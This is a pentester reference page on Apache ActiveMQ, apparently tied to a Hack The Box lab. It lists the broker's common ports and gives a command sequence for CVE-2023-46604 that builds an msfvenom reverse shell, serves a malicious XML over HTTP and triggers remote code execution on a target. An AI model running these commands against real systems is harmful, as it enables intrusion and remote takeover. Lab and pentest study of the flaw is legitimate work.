# Apache ActiveMQ

<div class="row row-cols-lg-2"><div>

Apache [ActiveMQ](https://activemq.apache.org/) is an open source [message broker](https://en.wikipedia.org/wiki/Message_broker) written in Java. It support multiple protocols such as JMS, MQTT, STOMP, AMQP.

* [Classic](https://github.com/apache/activemq) <small>(2.2k ⭐)</small> / [Artemis](https://github.com/apache/activemq-artemis) <small>(0.9k ⭐)</small>
* [Artemis Documentation](https://activemq.apache.org/components/artemis/documentation/)
* ActiveMQ Artemis is the next gen version

It's commonly used when we need to connect applications that are using different protocols.
</div><div>

**Common ports** 🐊

* 1883 <small>(TCP, MQTT)</small>
* 5671 <small>(TCP, SSL/TLS AMQP)</small>
* 5672 <small>(TCP, AMQP)</small>
* 8161 <small>(TCP, Admin Web)</small>
* 8883 <small>(TCP, SSL/TLS MQTT)</small>
* 61613 <small>(TCP, STOMP)</small>
* 61614 <small>(TCP, SSL/TLS STOMP)</small>
* 61616 <small>(TCP, ActiveMQ OpenWire transport)</small>
</div></div>

<hr class="sep-both">

## ActiveMQ Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

* [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604): vulnerability in ActiveMQ OpenWire Transport leading to remote code execution

```shell!

$ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git cve-2023-46604
$ cd cve-2023-46604
$ sed -i 's/0.0.0.0/x.y.z.t/g' poc-linux.xml
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 RHOSTS=broker.htb -f elf -o test.elf
$ go build
$ python -m http.server 8001 # in another terminal
$ ./ActiveMQ-RCE -i <target_ip> -u http://<your_IP>:8001/poc-linux.xml
```
</div><div>
</div></div>